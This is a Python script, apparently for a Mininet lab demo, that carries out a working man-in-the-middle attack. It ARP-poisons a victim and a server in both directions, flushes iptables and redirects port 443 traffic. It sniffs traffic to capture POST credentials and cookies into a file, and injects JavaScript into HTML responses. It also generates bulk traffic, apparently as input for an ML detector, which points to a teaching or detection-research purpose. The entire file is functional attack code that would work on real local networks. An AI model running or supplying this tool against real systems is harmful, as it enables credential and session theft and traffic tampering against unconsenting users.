# -*- coding: utf-8 -*-
"""
attacker_mitm.py  —  Realistic MITM attack for Mininet demo
Usage: python3 attacker_mitm.py <victim_ip> <server_ip> <interface>
e.g.:  python3 attacker_mitm.py 10.0.0.1 10.0.0.2 attacker-eth0
"""

import os, time, sys, threading, re
from scapy.all import *

# ── Config ──────────────────────────────────────────────
VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
IFACE     = sys.argv[3] if len(sys.argv) > 3 else "attacker-eth0"
STOLEN    = "/tmp/mitm_stolen.txt"

# ── Interface validation ────────────────────────────────
all_ifaces = get_if_list()
if IFACE not in all_ifaces:
    for candidate in ['attacker-eth0', 'eth0', str(conf.iface)]:
        if candidate in all_ifaces:
            print(f"⚠️  '{IFACE}' not found, using '{candidate}'")
            IFACE = candidate
            break

print(f"[*] Config — Victim:{VICTIM_IP}  Server:{SERVER_IP}  Iface:{IFACE}")
print(f"[*] Available interfaces: {all_ifaces}")

# ── IP forwarding + iptables ────────────────────────────
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1")
os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 "
          "-j REDIRECT --to-ports 10000 2>/dev/null")

# ── MAC resolution ──────────────────────────────────────
def get_mac(ip, retries=6):
    """Try ARP resolution, then fall back to local ARP cache."""
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=IFACE, timeout=3, verbose=False
            )
            if ans:
                mac = ans[0][1].hwsrc
                print(f"[+] Resolved {ip} → {mac}")
                return mac
        except Exception as e:
            print(f"[!] ARP attempt {attempt+1}/{retries} for {ip}: {e}")
        time.sleep(1)

    # Fallback: parse OS ARP cache
    cache = os.popen(f"arp -n {ip}").read()
    m = re.search(r'([\da-f]{2}:){5}[\da-f]{2}', cache, re.I)
    if m:
        print(f"[+] ARP cache hit: {ip} → {m.group(0)}")
        return m.group(0)

    # Last resort: static MACs for Mininet demo topology
    static = {'10.0.0.1': '00:00:00:00:00:01',
              '10.0.0.2': '00:00:00:00:00:02'}
    if ip in static:
        print(f"[!] Using static fallback MAC for {ip}: {static[ip]}")
        return static[ip]

    print(f"[!] FAILED to resolve {ip} — ARP poison will not work for this host")
    return None

# ── ARP poison loop ─────────────────────────────────────
def arp_poison_loop(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    my_mac     = get_if_hwaddr(IFACE)
    if not target_mac:
        return

    print(f"[+] Poisoning {target_ip} → claiming {spoof_ip} is at {my_mac}")
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=my_mac
    )
    count = 0
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        if count % 20 == 0:
            print(f"[~] ARP poison x{count} → {target_ip} claiming {spoof_ip}")
        time.sleep(0.5)

# ── Packet interception ─────────────────────────────────
def relay_and_intercept(pkt):
    if IP not in pkt:
        return
    src, dst = pkt[IP].src, pkt[IP].dst
    if src not in (VICTIM_IP, SERVER_IP) and dst not in (VICTIM_IP, SERVER_IP):
        return
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    try:
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
    except Exception:
        return

    # Steal POST credentials
    if 'POST' in payload and ('username' in payload or 'password' in payload):
        ts = time.strftime('%H:%M:%S')
        data = f"[{ts}] CREDENTIALS STOLEN!\n  From:{src} To:{dst}\n  {payload[:300]}\n"
        print("\n🎯"*10 + "\n" + data + "🎯"*10)
        open(STOLEN, 'a').write(data)

    # Steal cookies
    if 'Cookie:' in payload:
        cookies = re.findall(r'Cookie: (.+)', payload)
        if cookies:
            ts = time.strftime('%H:%M:%S')
            line = f"[{ts}] COOKIE: {cookies[0][:200]}\n"
            print(f"🍪 {line.strip()}")
            open(STOLEN, 'a').write(line)

    # Inject JS into HTML responses
    if 'HTTP/1' in payload and 'text/html' in payload and '</body>' in payload:
        modified = payload.replace(
            '</body>',
            '<script>document.title="HACKED"</script></body>'
        )
        pkt[Raw].load = modified.encode('utf-8', errors='ignore')
        del pkt[IP].chksum, pkt[IP].len, pkt[TCP].chksum
        sendp(pkt, iface=IFACE, verbose=False)

# ── Bulk traffic for ML detection ───────────────────────
def generate_bulk_traffic():
    import socket
    while True:
        try:
            for _ in range(30):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((SERVER_IP, 8080))
                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
                    s.recv(1024)
                finally:
                    s.close()
            time.sleep(0.1)
        except Exception:
            time.sleep(1)

# ── Start ───────────────────────────────────────────────
print("="*50)
print("🔴 MITM ATTACK STARTING")
print("="*50)

threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
time.sleep(3)
threading.Thread(target=generate_bulk_traffic, daemon=True).start()

print("✅ ARP Poisoning: active")
print("✅ IP Forwarding: active")
print("✅ Bulk traffic:  active")
print(f"✅ Logging to:    {STOLEN}")

sniff(
    filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
    prn=relay_and_intercept,
    iface=IFACE,
    store=False
)